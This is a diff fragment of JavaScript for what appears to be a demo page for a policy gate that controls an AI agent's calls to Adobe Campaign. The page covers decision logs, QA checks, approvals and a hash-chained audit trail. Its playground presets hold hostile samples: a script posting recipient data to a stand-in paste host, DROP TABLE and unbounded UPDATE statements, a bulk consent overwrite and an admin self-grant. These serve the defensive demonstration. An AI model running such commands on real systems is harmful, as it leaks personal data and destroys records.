+  $("#l-track").innerHTML = `<span style="width:${clean/tot*100}%;background:var(--positive)"></span><span style="width:${S.defVol/tot*100}%;background:repeating-linear-gradient(45deg,var(--negative) 0 6px,var(--negative-soft) 6px 10px)"></span><span style="width:${S.heldVol/tot*100}%;background:var(--border-strong)"></span>`;
+  const changed = S.steps.filter(s => s.actor === "agent" && s.decision !== BASE.steps.find(x => x.actor === "agent" && x.idx === s.idx).decision).length;
+  $("#diffnote").textContent = changed ? `${changed} of ${DATA.script.length} calls get a different decision than under the recommended policy. They are marked in the list below.` : (fixes.size ? "Same decisions as the recommended policy, with your QA fixes applied." : "This is the recommended policy. Change any rule to compare.");
+  renderLog();
+}
+function rowHTML(s){
+  const human = s.actor === "human";
+  const base = !human && BASE.steps.find(x => x.actor === "agent" && x.idx === s.idx);
+  const changed = !human && base.decision !== s.decision;
+  const tool = human ? "" : `<div class="tool">${esc(s.tool)} ${esc(argStr(s.args))}</div>`;
+  const risk = human ? "" : `<div class="riskbar" title="risk ${s.risk}"><i style="width:${s.risk}%;background:${RISKC(s.risk)}"></i></div>`;
+  const kind = human ? "human" : s.decision === "block" ? "block" : s.decision === "needs_approval" ? "human" : "ran";
+  return `<div class="row ${human ? "human" : ""} ${changed ? "changed" : ""}" data-kind="${kind}" data-changed="${changed}">
+    <div class="seq">#${s.seq}</div>
+    <div style="min-width:0"><div class="who">${human ? "Human · " + esc(s.role) : "Agent"}</div>
+      <div class="intent">${human ? (s.decision === "rejected" ? "Rejects the request" : "Signs the request") : esc(s.intent)}</div>
+      ${tool}<div class="reason">${esc(s.reason)}</div><div class="out">→ ${esc(s.outcome)}</div></div>
+    <div class="right"><span class="sl s-${s.decision}">${LABEL[s.decision]}</span>${risk}${changed ? `<span class="tag t-not">was ${LABEL[base.decision].toLowerCase()}</span>` : ""}</div></div>`;
+}
+function argStr(a){
+  if (!a) return "";
+  if (a.sql) return a.sql;
+  if (a.script) return a.script.length > 64 ? a.script.slice(0,61) + "…" : a.script;
+  if (a.delivery_id) return a.delivery_id;
+  if (a.workflow) return a.workflow + " · " + a.action;
+  if (a.schema) return a.schema + (a.limit ? " · limit " + fmt(a.limit) : "") + (a.group_by ? " · by " + a.group_by : "");
+  return "";
+}
+function renderLog(){
+  const phases = [];
+  SIM.steps.forEach(s => { let p = phases.find(x => x.name === s.phase); if (!p) phases.push(p = {name:s.phase, steps:[]}); p.steps.push(s); });
+  $("#log").innerHTML = phases.map(p => { const bl = p.steps.filter(s => s.decision === "block").length, n = p.steps.filter(s => s.actor === "agent").length;
+    return `<div class="phgrp"><div class="ph">${esc(p.name)}<span>${n} call${n > 1 ? "s" : ""}${bl ? " · " + bl + " blocked" : ""}</span></div>${p.steps.map(rowHTML).join("")}</div>`; }).join("");
+  applyFilter();
+}
+function applyFilter(){
+  $$(".row").forEach(r => r.hidden = !(filter === "all" || (filter === "changed" ? r.dataset.changed === "true" : r.dataset.kind === filter)));
+  $$(".phgrp").forEach(g => g.hidden = !g.querySelector(".row:not([hidden])"));
+}
+$$(".qf").forEach(b => b.addEventListener("click", () => { filter = b.dataset.f; $$(".qf").forEach(x => x.setAttribute("aria-pressed", x === b)); applyFilter(); }));
+let timer = null;
+function stopReplay(){ clearInterval(timer); timer = null; $$(".row").forEach(r => r.classList.remove("dim","live")); $("#play").textContent = "▶ Replay"; }
+$("#play").addEventListener("click", () => {
+  if (timer) return stopReplay();
+  $$(".qf")[0].click();
+  const rows = $$(".row"); rows.forEach(r => r.classList.add("dim"));
+  let i = 0; $("#play").textContent = "■ Stop";
+  const reduce = matchMedia("(prefers-reduced-motion: reduce)").matches;
+  timer = setInterval(() => {
+    if (i > 0) rows[i-1].classList.remove("live");
+    if (i >= rows.length) return stopReplay();
+    rows[i].classList.remove("dim"); rows[i].classList.add("live");
+    rows[i].scrollIntoView({block:"nearest", behavior: reduce ? "auto" : "smooth"}); i++;
+  }, 600);
+});
+
+/* ================= QA board ================= */
+let sel = null;
+function renderBoard(){
+  const dels = deliveriesNow(), ids = Object.keys(QA_META);
+  const qas = dels.map(d => runQA(d, policy));
+  $("#board").innerHTML = `<thead><tr><th scope="col" style="text-align:left;padding-left:16px">Market</th>${ids.map(i => `<th scope="col">${QA_META[i][1]}</th>`).join("")}<th scope="col">In the lab</th></tr></thead><tbody>` +
+    qas.map(q => `<tr><th scope="row">${MK[q.market].name}<small>${q.delivery} · ${q.passed}/${q.total}</small></th>${ids.map(id => {
+      const c = q.checks.find(x => x.id === id), fixed = fixes.has(q.delivery + ":" + id);
+      const cls = fixed ? "fixed" : c.passed ? "pass" : c.severity, sym = c.passed ? "✓" : c.severity === "blocker" ? "✕" : "!";
+      const on = sel && sel[0] === q.delivery && sel[1] === id;
+      return `<td><button class="cell c-${cls}" data-d="${q.delivery}" data-c="${id}" aria-pressed="${!!on}" aria-label="${esc(MK[q.market].name)}, ${esc(c.label)}: ${fixed ? "fixed" : c.passed ? "pass" : c.severity}">${sym}</button></td>`; }).join("")}
+      <td><span class="tag ${SIM.sentIds.has(q.delivery) ? (q.blockers.length ? "t-neg" : "t-pos") : "t-neu"}">${SIM.sentIds.has(q.delivery) ? (q.blockers.length ? "Sent with defect" : "Sent") : "Held"}</span></td></tr>`).join("") + "</tbody>";
+  $$("#board .cell").forEach(b => b.addEventListener("click", () => { sel = [b.dataset.d, b.dataset.c]; renderBoard(); }));
+  if (!sel){ const f = qas.find(q => q.blockers.length); sel = f ? [f.delivery, f.blockers[0]] : [qas[0].delivery, "unsubscribe_link"]; return renderBoard(); }
+  const q = qas.find(x => x.delivery === sel[0]), c = q.checks.find(x => x.id === sel[1]), key = sel.join(":"), fixed = fixes.has(key);
+  const canFix = FIXABLE.has(c.id) && !c.passed;
+  $("#qadetail").innerHTML = `<div class="txt"><span class="sl ${c.passed ? "s-allow" : c.severity === "blocker" ? "s-block" : "s-needs_approval"}">${fixed ? "Fixed" : c.passed ? "Pass" : c.severity === "blocker" ? "Blocker" : "Warning"}</span>
+    <h3 style="margin-top:6px">${esc(MK[q.market].name)} · ${esc(c.label)}</h3><p>${esc(c.detail)}</p></div>
+    <div style="display:flex;gap:8px;flex-wrap:wrap">${canFix ? `<button class="btn btn-accent btn-sm" id="fix">Apply fix</button>` : ""}${fixed ? `<button class="btn btn-sec btn-sm" id="unfix">Undo fix</button>` : ""}${fixes.size ? `<button class="btn btn-sec btn-sm" id="unfixall">Undo all fixes (${fixes.size})</button>` : ""}</div>`;
+  $("#fix")?.addEventListener("click", () => { fixes.add(key); refresh(); });
+  $("#unfix")?.addEventListener("click", () => { fixes.delete(key); refresh(); });
+  $("#unfixall")?.addEventListener("click", () => { fixes.clear(); refresh(); });
+}
+
+/* ================= playground ================= */
+const PRESET_SQL = [
+  ["Count by market","SELECT iCountry, COUNT(*) FROM NmsRecipient GROUP BY iCountry"],
+  ["Delete bounces","DELETE FROM NmsRecipient WHERE iBlackList = 1"],
+  ["Update without WHERE","UPDATE NmsRecipient SET iBlackListEmail = 0"],
+  ["Drop table","DROP TABLE NmsBroadLogRcp"],
+];
+const PRESET_JS = [
+  ["Read-only count","var q = xtk.queryDef.create(<queryDef schema='nms:broadLogRcp' operation='count'/>);\nlogInfo(q.ExecuteQuery());"],
+  ["Bulk consent overwrite","xtk.session.Write(<recipient xtkschema='nms:recipient' _operation='update'\n  _key='@country' country='HU' consentMarketing='1'/>);"],
+  ["Exfiltrate audience","var r = new HttpClientRequest('https://paste.example.net/upload');\nr.body = JSON.stringify(recipients);\nr.execute();"],
+  ["Start a delivery","nms.delivery.Start(4321);"],
+  ["Grant admin","xtk.operator.Grant('agent', 'admin');"],
+];
+function chips(sel, list, ed){
+  $(sel).innerHTML = list.map(([l],i) => `<button class="chip" data-i="${i}">${esc(l)}</button>`).join("");
+  $$(sel + " .chip").forEach(b => b.addEventListener("click", () => { $(ed).value = list[+b.dataset.i][1]; }));
+}
+chips('[data-for="ed-sql"]', PRESET_SQL, "#ed-sql"); chips('[data-for="ed-js"]', PRESET_JS, "#ed-js");
+$("#ed-sql").value = PRESET_SQL[1][1]; $("#ed-js").value = PRESET_JS[1][1];
+$("#pg-del").innerHTML = BASE_DELIVERIES.map(d => `<option value="${d.id}">${d.id} · ${MK[d.market].name} · ${fmt(d.target_count)}</option>`).join("");
+$("#pg-del").value = "DM_BF26_CZ";
+$("#pg-wf").innerHTML = DATA.workflows.map(w => `<option value="${w.internal_name}">${w.internal_name} (${w.environment}${w.critical ? ", protected" : ""})</option>`).join("");
+$("#pg-wf").value = "WKF_GDPR_Purge"; $("#pg-act").value = "pause";
+let tab = "sql";
+$$('[role="tab"]').forEach(t => t.addEventListener("click", () => {
+  tab = t.id.slice(4);
+  $$('[role="tab"]').forEach(x => x.setAttribute("aria-selected", x === t));
+  $$('[role="tabpanel"]').forEach(p => p.hidden = p.id !== "pane-" + tab);
+}));
+function delQA(){ const d = deliveriesNow().find(x => x.id === $("#pg-del").value), q = runQA(d, policy);
+  $("#pg-delqa").innerHTML = `<span class="sl ${q.status === "pass" ? "s-allow" : q.status === "fail" ? "s-block" : "s-needs_approval"}">${q.status.replace(/_/g," ")} · ${q.passed}/${q.total}</span>`; }
+$("#pg-del").addEventListener("change", delQA);
+
+const PG = {writes:0, tickets:[], chain:[], n:0};
+async function sha256(str){
+  try { const b = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(str)); return [...new Uint8Array(b)].map(x => x.toString(16).padStart(2,"0")).join(""); }
+  catch(e){ let h = 2166136261; for (const ch of str){ h ^= ch.charCodeAt(0); h = Math.imul(h, 16777619); } return ("fnv" + (h >>> 0).toString(16)).padEnd(64,"0"); }
+}
+async function audit(rec){
+  const prev = PG.chain.length ? PG.chain[PG.chain.length - 1].hash : "0".repeat(64);
+  const e = {seq:PG.chain.length + 1, prev, ...rec};
+  e.hash = await sha256(JSON.stringify(e)); PG.chain.push(e); renderChain();
+}
+function renderChain(){
+  $("#livechain").innerHTML = PG.chain.length ? PG.chain.slice().reverse().map(e => `<div class="lc"><span>#${e.seq}</span><span class="h"><b>${esc(e.tool)} · ${esc(e.decision)}</b><br>prev ${e.prev.slice(0,10)}… → ${e.hash.slice(0,12)}…</span></div>`).join("") : `<div class="empty">No entries yet. Submit a call.</div>`;
+}
+function currentCall(){
+  if (tab === "sql") return ["query.run", {sql:$("#ed-sql").value.trim()}];
+  if (tab === "js") return ["js.execute", {script:$("#ed-js").value.trim()}];
+  if (tab === "send") return ["delivery.send", {delivery_id:$("#pg-del").value}];
+  return ["workflow.control", {workflow:$("#pg-wf").value, action:$("#pg-act").value}];
+}
+function pgCtx(){ return {policy, writes:PG.writes, deliveries:deliveriesNow()}; }
+$("#submit").addEventListener("click", async () => {
+  const [tool, args] = currentCall();
+  if (!Object.values(args)[0]) { $("#pg-result").innerHTML = `<div class="empty">Write something to submit first.</div>`; return; }
+  const dec = evaluate(tool, args, pgCtx());
+  let note = "";
+  if (dec.decision === "allow"){ if (tool !== "query.run") PG.writes++; note = dec.unsafe ? "Executed. " + dec.unsafe + "." : "Executed on the instance."; }
+  if (dec.decision === "allow_masked") note = "Ran with PII masked.";
+  if (dec.decision === "dry_run") note = "Analysed and explained. Nothing ran.";
+  if (dec.decision === "needs_approval"){
+    const t = {id:"APR-" + String(++PG.n).padStart(3,"0"), tool, args, n:dec.n || 1, signed:[], reason:dec.reason, err:""};
+    PG.tickets.push(t); note = t.id + " is waiting in the approval inbox."; renderInbox();
+  }
+  if (dec.decision === "block") note = dec.alt || "Stopped before reaching Campaign.";
+  $("#pg-result").innerHTML = `<div class="top"><span class="dec" style="color:${{allow:"var(--positive)",allow_masked:"var(--info)",dry_run:"var(--purple)",needs_approval:"var(--notice)",block:"var(--negative)"}[dec.decision]}">${LABEL[dec.decision]}</span><span class="tag t-neu">risk ${dec.risk}</span></div>
+    <dl><dt>Tool</dt><dd class="mono">${esc(tool)}</dd><dt>Rule</dt><dd class="mono">${esc(dec.rule)}</dd><dt>Why</dt><dd>${esc(dec.reason)}</dd><dt>Result</dt><dd>${esc(note)}</dd></dl>
+    ${dec.findings && dec.findings.length ? `<ul class="find">${dec.findings.map(f => `<li>${esc(f)}</li>`).join("")}</ul>` : ""}`;
+  await audit({actor:"you", tool, decision:dec.decision, rule:dec.rule});
+});
+$("#reset").addEventListener("click", () => { PG.writes = 0; PG.tickets = []; PG.chain = []; PG.n = 0; renderInbox(); renderChain(); $("#pg-result").innerHTML = `<div class="empty">Session reset. Write counter, inbox and chain are empty.</div>`; });
+const ROLES = [["ana.horvat","Market owner"],["marko.novak","CRM ops lead"],["intern.01","Intern"]];
+function renderInbox(){
+  $("#nav-inbox").textContent = PG.tickets.length;
+  $("#inbox").innerHTML = PG.tickets.length ? PG.tickets.map(t => `<div class="ticket" data-t="${t.id}">
+    <div class="tt"><span>${t.id} · ${esc(t.tool)}</span><span class="tag t-not">${t.signed.length}/${t.n} signed</span></div>
+    <p>${esc(argStr(t.args))}. ${esc(t.reason)}.</p>
+    <div class="acts">${ROLES.map(([u,r]) => `<button class="btn btn-sec btn-sm" data-a="ok" data-u="${u}" data-r="${r}">Approve as ${r}</button>`).join("")}<button class="btn btn-neg btn-sm" data-a="no">Reject</button></div>
+    ${t.err ? `<div class="err">${esc(t.err)}</div>` : ""}</div>`).join("") : `<div class="empty">Nothing waiting. Request a send or a production workflow action in the playground.</div>`;
+  $$("#inbox .ticket button").forEach(b => b.addEventListener("click", () => act(b.closest(".ticket").dataset.t, b.dataset.a, b.dataset.u, b.dataset.r)));
+}
+async function act(id, a, u, r){
+  const t = PG.tickets.find(x => x.id === id); t.err = "";
+  const done = async (decision, text) => { PG.tickets = PG.tickets.filter(x => x !== t); renderInbox();
+    $("#pg-result").innerHTML = `<div class="top"><span class="dec" style="color:${decision === "approved" ? "var(--positive)" : "var(--negative)"}">${t.id}: ${esc(LABEL[decision] || decision)}</span></div><dl><dt>Result</dt><dd>${esc(text)}</dd></dl>`;
+    await audit({actor:u || "approver", tool:t.tool, decision, rule:"approval"}); };
+  if (a === "no") return done("rejected", "Rejected by a human. Nothing ran.");
+  const allowed = t.tool === "delivery.send" ? ["Market owner","CRM ops lead"] : ["CRM ops lead"];
+  if (!allowed.includes(r)) { t.err = r + " cannot approve " + t.tool + ". Allowed roles: " + allowed.join(", ") + "."; return renderInbox(); }
+  if (t.signed.includes(u)) { t.err = "The same person cannot approve twice."; return renderInbox(); }
+  t.signed.push(u);
+  if (t.signed.length < t.n) { renderInbox(); await audit({actor:u, tool:t.tool, decision:"partial_approval", rule:"approval"}); return; }
+  const re = evaluate(t.tool, t.args, pgCtx());
+  if (re.decision === "block") return done("rejected", "Blocked on re-check at execution time: " + re.reason);
+  PG.writes++;
+  const d = t.tool === "delivery.send" && deliveriesNow().find(x => x.id === t.args.delivery_id);
+  done("approved", d ? "Signed by " + t.signed.join(" and ") + ". Sent to " + fmt(d.target_count) + " recipients in " + MK[d.market].name + "." : "Signed by " + t.signed.join(", ") + ". Executed.");
+}
+
+/* ================= audit forge ================= */
+const AE = DATA.audit_entries; let forged = null;
+function renderAudit(){
+  $("#chain").innerHTML = AE.slice(0, 12).map(e => {
+    const f = forged === e.seq, after = forged && e.seq > forged, bad = forged && e.seq >= forged;
+    const dec = f ? (e.decision === "block" ? "allow" : "block") : e.decision;
+    return `<button class="link ${f ? "forged" : ""} ${after ? "after" : ""}" data-s="${e.seq}" aria-label="Forge entry ${e.seq}"><span>#${e.seq}</span>
+      <span class="h"><b>${esc(e.tool)} · ${f ? `<s>${esc(e.decision)}</s> ${esc(dec)}` : esc(dec)}</b><br>prev ${e.prev.slice(0,10)}… → ${e.hash.slice(0,10)}…</span>
+      <span class="sl ${bad ? "s-block" : "s-allow"}">${bad ? "fails" : "ok"}</span></button>`; }).join("") +
+    `<div class="link" style="cursor:default"><span>…</span><span class="h">${AE.length - 12} more entries · head ${DATA.audit.head.slice(0,16)}…</span><span class="sl ${forged ? "s-block" : "s-allow"}">${forged ? "fails" : "ok"}</span></div>`;
+  $$("#chain button.link").forEach(b => b.addEventListener("click", () => { forged = +b.dataset.s; renderAudit(); }));
+  $("#vstate").className = "vstate " + (forged ? "bad" : "ok");
+  $("#vstate").textContent = forged ? "Broken at entry #" + forged : "Chain intact";
+  $("#vtext").textContent = forged
+    ? `Rewriting entry #${forged} changed its hash, so its successor’s “prev” no longer matches. Entries #${forged} to #${AE.length} fail verification. Anyone holding the file can detect the edit.`
+    : `${AE.length} entries verified against the SHA-256 chain, including every blocked call. Select an entry to forge it.`;
+  $("#restore").hidden = !forged;
+}
+$("#restore").addEventListener("click", () => { forged = null; renderAudit(); });
+
+/* ================= live YAML ================= */
+function renderYaml(){
+  const v = (k, val) => ({val, chg: policy[k] !== DEFAULT[k]});
+  const L = [
+    ["# ACC Agent Gate policy · decisions: allow | allow_masked | dry_run | needs_approval | block"],
+    ["# Fail-closed: a tool that is not listed here is blocked."],
+    [""],
+    ["version:", "1"], ["instance:", "aurora-mkt-prod", "synthetic demo instance"],
+    ["kill_switch:", v("kill_switch", policy.kill_switch), "true = every write is blocked"],
+    [""], ["session_limits:"],
+    ["  max_write_calls:", v("max_writes", policy.max_writes)],
+    ["  max_rows_per_query:", v("max_rows", policy.max_rows)],
+    [""], ["data:"], ["  mask_pii:", v("mask_pii", policy.mask_pii)],
+    [""], ["tools:"],
+    ["  campaign.discover: { mode:", "allow }"], ["  schema.browse: { mode:", "allow }"], ["  delivery.qa: { mode:", "allow }"],
+    ["  query.run:"], ["    block_sql_writes:", v("block_sql_writes", policy.block_sql_writes)],
+    ["  delivery.send:"],
+    ["    mode:", v("send_approval", policy.send_approval ? "needs_approval" : "allow")],
+    ["    require_qa:", v("require_qa", policy.require_qa)],
+    ["    dual_approval_over:", v("dual_over", policy.dual_over)],
+    ["    approver_roles:", "[market_owner, crm_ops_lead]"],
+    ["  workflow.control:"],
+    ["    mode:", v("wf_approval", policy.wf_approval ? "needs_approval" : "allow")],
+    ["    block_critical:", v("block_critical", policy.block_critical), "GDPR purge, unsubscribe sync"],
+    ["    stage_environment:", "allow"],
+    ["  js.execute:"], ["    mode:", v("js_mode", policy.js_mode)],
+    ["    block_categories:", v("js_block", policy.js_block ? "[write, send, workflow, system, egress, admin]" : "[]")],
+    [""], ["qa:"], ["  quiet_hours_local:", v("quiet", policy.quiet ? "[21, 8]" : "off")], ["  subject_max_chars:", "50", "Adobe best practice: 50 or fewer"],
+  ];
+  $("#yaml").innerHTML = L.map(([k, val, c]) => {
+    if (val === undefined) return k.startsWith("#") ? `<span class="c">${esc(k)}</span>` : k ? `<span class="k">${esc(k)}</span>` : "";
+    const o = typeof val === "object" ? val : {val, chg:false};
+    const vv = `<span class="v">${esc(String(o.val))}</span>`;
+    return `<span class="${o.chg ? "chg" : ""}"><span class="k">${esc(k)}</span> ${vv}${c ? ` <span class="c"># ${esc(c)}</span>` : ""}</span>`;
+  }).join("\n");
+}
+
+/* ================= sources ================= */
+const SRC = [
+ ["MCP Servers – Adobe CX Enterprise","https://experienceleague.adobe.com/en/docs/cx-enterprise-agentic-tools/using/tools/mcp-servers","Lists Campaign Classic capabilities for agents: instance discovery, schema browsing, query execution, workflow control, SOAP/JS execution. No direct endpoint; access depends on entitlements and user permissions.","Updated 16 Sep 2026"],
+ ["Adobe CX Enterprise Coworker overview","https://experienceleague.adobe.com/en/docs/cx-enterprise-coworker/content/home","Adobe’s agent experience. Results come back for approval; governance and approval workflows are defined per customer; roles are set in Admin Console.","Updated 27 Oct 2026"],
+ ["Delivery best practices – check before sending","https://experienceleague.adobe.com/en/docs/campaign-classic/using/sending-messages/key-steps-when-creating-a-delivery/delivery-bestpractices/check-before-sending","Proofs, a working opt-out link, subject of 50 characters or fewer, a deduplicated target, and the validation process.","Updated 5 Oct 2026"],
+ ["Preview and test your email (Campaign v8)","https://experienceleague.adobe.com/en/docs/campaign/campaign-v8/send/validate/preview-and-proof","Basis for the proof sign-off check.",""],
+ ["About seed addresses","https://experienceleague.adobe.com/en/docs/campaign-classic/using/sending-messages/using-seed-addresses/about-seed-addresses","Basis for the seed list check.",""],
+ ["Get started with permissions (Campaign v8)","https://experienceleague.adobe.com/en/docs/campaign/campaign-v8/permissions/gs-permissions","Operator groups, named rights and folder permissions: the outer boundary the gate sits inside.","Updated 5 Oct 2026"],
+ ["Work with business rules (typologies)","https://experienceleague.adobe.com/en/docs/campaign-web/v8/conf/typologies","Basis for the typology check.",""],
+ ["Manage subscriptions and unsubscriptions (Campaign v8)","https://experienceleague.adobe.com/nl/docs/campaign/campaign-v8/audience/subscriptions","Basis for the unsubscribe link check.",""],
+ ["Manage Privacy requests in Campaign","https://experienceleague.adobe.com/en/docs/campaign/campaign-v8/privacy/privacy","Why privacy and erasure workflows are protected from agent control.",""],
+];
+$("#srclist").innerHTML = SRC.map(([t,u,w,d],i) => `<li id="src-${i+1}"><span class="n">[${i+1}]</span><div style="min-width:0"><a href="${u}" target="_blank" rel="noopener">${esc(t)}</a><p>${esc(w)}</p>${d ? `<span class="d">${d}</span>` : ""}</div></li>`).join("");
+
+/* ================= nav highlight ================= */
+const navLinks = $$(".sidenav a");
+const io = "IntersectionObserver" in window ? new IntersectionObserver(es => es.forEach(e => {
+  if (e.isIntersecting){ navLinks.forEach(a => a.classList.toggle("on", a.getAttribute("href") === "#" + e.target.id)); }
+}), {rootMargin:"-30% 0px -60% 0px"}) : null;
+if (io) $$("main section, #approvals").forEach(s => io.observe(s));
+
+/* ================= boot ================= */
+function refresh(){ if (timer) stopReplay(); SIM = simulate(policy); bindControls(); renderLab(); renderBoard(); renderYaml(); delQA(); }
+wire(); refresh(); renderInbox(); renderChain(); renderAudit();
+</script>
